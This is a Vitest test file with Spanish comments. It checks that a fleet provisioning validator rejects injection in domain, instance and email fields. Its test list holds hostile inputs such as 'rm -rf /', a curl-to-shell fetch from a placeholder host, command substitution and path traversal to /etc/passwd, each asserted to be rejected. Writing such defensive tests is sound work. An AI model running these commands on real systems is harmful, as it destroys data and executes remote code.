import { describe, it, expect } from 'vitest'
// @ts-expect-error — módulo .mjs sin tipos, como el resto de `apps/flota`
import { validarSolicitud, argumentosDeAlta, CAMPOS } from './solicitudes.mjs'

// ============================================================================
//  La validación de una solicitud de alta.  (ADR 0027)
//
//  ESTA ES LA SUPERFICIE REAL DE TODO EL DISEÑO, y por eso casi todo lo de aquí
//  son ataques.
//
//  El panel no tiene credenciales: lo único que puede hacer un panel
//  comprometido es ESCRIBIR UNA SOLICITUD. El ejecutor la lee y aprovisiona una
//  máquina con ella. Así que la solicitud es la entrada no confiable del
//  sistema, y se valida en el ejecutor OTRA VEZ -- no porque el panel valide
//  mal, sino porque el ejecutor no puede fiarse de que quien escribió el
//  archivo fuera el panel.
// ============================================================================

const buena = { instancia: 'pixeled', dominio: 'space-os.pixeled.mx', email: 'jefe@pixeled.mx' }

describe('lo que pasa, pasa entero', () => {
  it('una solicitud correcta se acepta', () => {
    const r = validarSolicitud(buena)
    expect(r.ok, JSON.stringify(r.errores)).toBe(true)
  })

  it('faltar un campo la rechaza, y dice cuál', () => {
    for (const campo of CAMPOS) {
      const copia: any = { ...buena }
      delete copia[campo]
      const r = validarSolicitud(copia)
      expect(r.ok, `sin ${campo} deberia fallar`).toBe(false)
      expect(r.errores.join(' ')).toContain(campo)
    }
  })
})

describe('nada de lo que llega acaba en una linea de comandos', () => {
  // El ejecutor lanza `provision-instancia.sh`. Si estos valores llegaran a un
  // shell, cualquiera de estos los convertiria en ejecucion de comandos EN EL
  // PADRE, que es la maquina con los tokens de toda la flota.
  const venenos = [
    'a.mx; rm -rf /',
    'a.mx && curl http://x/y | sh',
    'a.mx$(whoami)',
    'a.mx`id`',
    'a.mx | tee /tmp/x',
    'a.mx\nrm -rf /',
    'a.mx\r\nX',
    '--dominio=otro',
    '-rf',
    '../../etc/passwd',
    'a mx',
    "a'mx",
    'a"mx',
  ]

  it('el dominio los rechaza TODOS', () => {
    for (const v of venenos) {
      expect(validarSolicitud({ ...buena, dominio: v }).ok, `paso: ${JSON.stringify(v)}`).toBe(false)
    }
  })

  it('el nombre de la instancia también', () => {
    for (const v of venenos) {
      expect(validarSolicitud({ ...buena, instancia: v }).ok, `paso: ${JSON.stringify(v)}`).toBe(false)
    }
  })

  it('y el correo', () => {
    for (const v of venenos) {
      expect(validarSolicitud({ ...buena, email: v }).ok, `paso: ${JSON.stringify(v)}`).toBe(false)
    }
  })

  it('el nombre no puede empezar por guion, que un guion lo lee como bandera', () => {
    expect(validarSolicitud({ ...buena, instancia: '-x' }).ok).toBe(false)
    expect(validarSolicitud({ ...buena, dominio: '-x.mx' }).ok).toBe(false)
  })

  it('ni servir para salirse del directorio de solicitudes', () => {
    // El nombre acaba siendo parte de un nombre de archivo.
    for (const v of ['../otro', 'a/b', 'a\\b', '.', '..']) {
      expect(validarSolicitud({ ...buena, instancia: v }).ok, v).toBe(false)
    }
  })
})

describe('lo que la solicitud NO puede decidir', () => {
  it('ni region, ni tamaño, ni canal: son del entorno del ejecutor', () => {
    // Un desplegable con `beta` seria saltarse el invariante 13 sin darse
    // cuenta, y una region elegida desde fuera es una factura elegida desde
    // fuera. Aunque vengan en el archivo, se ignoran.
    const args = argumentosDeAlta(
      { ...buena, canal: 'beta', region: 'fra1', tamano: 's-8vcpu-16gb' },
      { DO_REGION: 'nyc1', DO_TAMANO: 's-1vcpu-1gb' },
    )
    expect(args.entorno.DO_REGION).toBe('nyc1')
    expect(args.entorno.DO_TAMANO).toBe('s-1vcpu-1gb')
    expect(args.entorno.CANAL, 'el canal NO se pasa: el guion usa `estable` por omision').toBeUndefined()
    expect(args.argumentos.join(' ')).not.toMatch(/beta|fra1|16gb/)
  })

  it('los argumentos van como LISTA, nunca como una cadena', () => {
    // Con una lista y `spawn` sin shell, un valor raro es un valor raro y no
    // un comando. La cadena es lo que convierte un dato en ejecucion.
    const args = argumentosDeAlta(buena, { DO_REGION: 'nyc1', DO_TAMANO: 's-1vcpu-1gb' })
    expect(Array.isArray(args.argumentos)).toBe(true)
    expect(args.argumentos).toContain('--dominio')
    expect(args.argumentos).toContain('space-os.pixeled.mx')
  })

  it('y no se construye nada si la solicitud no es valida', () => {
    expect(() => argumentosDeAlta({ ...buena, dominio: 'a.mx; id' }, {})).toThrow()
  })
})
